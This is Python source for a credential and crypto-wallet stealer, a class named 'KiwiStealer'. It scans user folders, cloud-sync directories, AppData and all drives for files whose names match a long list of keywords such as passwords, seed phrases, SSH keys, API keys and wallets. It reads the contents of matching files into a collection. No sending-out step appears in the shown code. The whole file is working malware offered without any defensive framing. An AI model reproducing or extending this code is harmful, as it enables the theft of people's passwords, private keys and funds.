import os
import time
import threading

FILE_KEYWORDS = [
    'password', 'passw', 'passwd', 'mdp', 'motdepasse', 'mot_de_passe',
    'login', 'logins', 'secret', 'secrets', 'account', 'acount', 'accounts',
    'paypal', 'banque', 'bank', 'banks', 'crypto', 'crypt', 'wallet', 'wallets',
    'metamask', 'exodus', 'atomic', 'electrum', 'coinbase', 'binance',
    'discord', 'token', 'tokens', 'backup', 'backups', 'seed', 'seedphrase',
    '2fa', 'twofactor', 'code', 'memo', 'compte', 'seecret',
    'key', 'keys', 'private', 'privatekey', 'recovery', 'mnemonic',
    'vpn', 'expressvpn', 'nordvpn', 'protonvpn',
    'api', 'apis', 'api_key', 'apikey', 'api-secret',
    'auth', 'authkey', 'authorization', 'authenticator',
    'bitcoin', 'ethereum', 'solana', 'litecoin', 'monero', 'dogecoin',
    'passphrase', 'pass-phrase', 'secret_phrase',
    'credentials', 'credential', 'signin', 'sign-in',
    'ssh', 'ssh-key', 'putty', 'known_hosts', 'id_rsa',
    ' telegram', 'session', 'sessions',
    'db_pass', 'db_passw', 'database_pass',
    'opensea', 'rarible', 'nft', 'trezor', 'ledger', 'keepkey',
    'ftx', 'kucoin', 'kraken', 'bitfinex', 'cryptocom',
    'robinhood', 'webull', 'trading', 'finance',
    'gmail_pass', 'mail_pass', 'email_pass',
    'config', 'configuration', 'settings',
    'htaccess', 'htpasswd', 'wp-config',
    'docke', 'dockerhub', 'kubeconfig', 'aws',
    'azure', 'gcloud', 'gcp', 'heroku', 'digitalocean',
]

EXTENSIONS = ['.txt', '.log', '.cfg', '.conf', '.ini', '.dat', '.kdbx',
              '.key', '.pem', '.ppk', '.ovpn', '.rdp', '.kdb', '.json',
              '.xml', '.yaml', '.yml', '.csv', '.sql', '.db', '.sqlite']

SKIP_DIRS = [
    'Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
    '$Recycle.Bin', 'System Volume Information', 'boot',
    'AppData\\Local\\Temp', 'AppData\\Local\\Microsoft\\Windows\\INetCache',
    '.git', '__pycache__', 'node_modules', '.npm', '.yarn', '.cache',
]

class KiwiStealer:
    def __init__(self):
        self.found_files = []
        self._lock = threading.Lock()
        self._searched = set()
        self._start_time = None
        self._max_seconds = 45

    def should_skip(self, dirpath):
        parts = dirpath.lower().split(os.sep)
        for skip in SKIP_DIRS:
            if skip.lower() in dirpath.lower():
                return True
        if any(p.startswith('.') for p in parts):
            return True
        return False

    def time_exceeded(self):
        if self._start_time is None:
            return False
        return (time.time() - self._start_time) > self._max_seconds

    def search_directory(self, root_path, max_depth=4):
        if max_depth <= 0 or self.time_exceeded():
            return
        try:
            with os.scandir(root_path) as it:
                for entry in it:
                    if self.time_exceeded():
                        return
                    if self.should_skip(entry.path):
                        continue
                    try:
                        if entry.is_file():
                            self.check_file(entry.path)
                        elif entry.is_dir() and not entry.name.startswith('.'):
                            if entry.path not in self._searched:
                                self._searched.add(entry.path)
                                self.search_directory(entry.path, max_depth - 1)
                    except:
                        pass
        except:
            pass

    def check_file(self, filepath):
        try:
            name_lower = os.path.basename(filepath).lower()
            ext = os.path.splitext(filepath)[1].lower()
            for kw in FILE_KEYWORDS:
                if kw.lower() in name_lower:
                    try:
                        size = os.path.getsize(filepath)
                        content = ''
                        if ext in EXTENSIONS and size < 50000:
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read(2000)
                            except:
                                content = '[Binary or unreadable]'
                        elif size > 50000:
                            content = '[File too large: ' + str(size) + ' bytes]'
                        with self._lock:
                            self.found_files.append({
                                'path': filepath,
                                'content': content,
                                'size': size,
                            })
                    except:
                        pass
                    break
        except:
            pass

    def steal_all(self):
        self._start_time = time.time()
        user_home = os.path.expanduser('~')
        drives = []
        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            drive = letter + ':\\'
            if os.path.exists(drive):
                drives.append(drive)

        threads = []
        user_dirs = [
            user_home,
            os.path.join(user_home, 'Desktop'),
            os.path.join(user_home, 'Downloads'),
            os.path.join(user_home, 'Documents'),
            os.path.join(user_home, 'Pictures'),
            os.path.join(user_home, 'Videos'),
            os.path.join(user_home, 'Music'),
            os.path.join(user_home, 'OneDrive'),
            os.path.join(user_home, 'Dropbox'),
            os.path.join(user_home, 'Google Drive'),
            os.path.join(os.environ.get('APPDATA', ''), '..'),
        ]
        for d in set(user_dirs):
            d = os.path.abspath(d)
            if os.path.exists(d) and d not in self._searched:
                self._searched.add(d)
                t = threading.Thread(target=self.search_directory, args=(d, 5))
                threads.append(t)
                t.start()

        for d in drives:
            if os.path.exists(d) and d not in self._searched:
                self._searched.add(d)
                t = threading.Thread(target=self.search_directory, args=(d, 2))
                threads.append(t)
                t.start()

        for t in threads:
            t.join()
